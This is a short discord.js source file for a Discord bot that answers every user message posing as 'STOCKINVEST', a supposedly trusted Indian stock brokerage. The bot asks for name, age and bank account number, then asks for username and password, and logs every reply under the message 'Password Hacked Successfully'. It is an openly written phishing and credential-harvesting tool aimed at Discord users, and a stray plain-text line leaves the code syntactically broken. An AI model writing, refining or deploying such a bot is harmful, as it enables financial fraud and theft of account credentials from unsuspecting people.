 const { Client, GatewayIntentBits } = require("discord.js");

 const client = new Client({
     intents: [GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent],

 });
guilds - update,add,delete messages 


 client.on('messageCreate', (message) => {
     if(message.author.bot) return;
     
     message.reply({
        content: "Hi, This is from STOCKINVEST.The most trusted stock market news and brokerage of India , all details are available here . Please enter your Name, age and  banking account number and other details for verification , Type Yes to join",
    });
    
    if(message.content==="Yes") {
     message.reply({
       content: "Type Username and password",
    });
     
 }
  console.log("Password Hacked Successfully : ")  
 console.log(message.content);
   return;
 });



 client.on('interactionCreate', interaction => {
     console.log(interaction);
     interaction.reply("Pong!!");
 })

 client.login(
    "LOGIN_ID"
 );

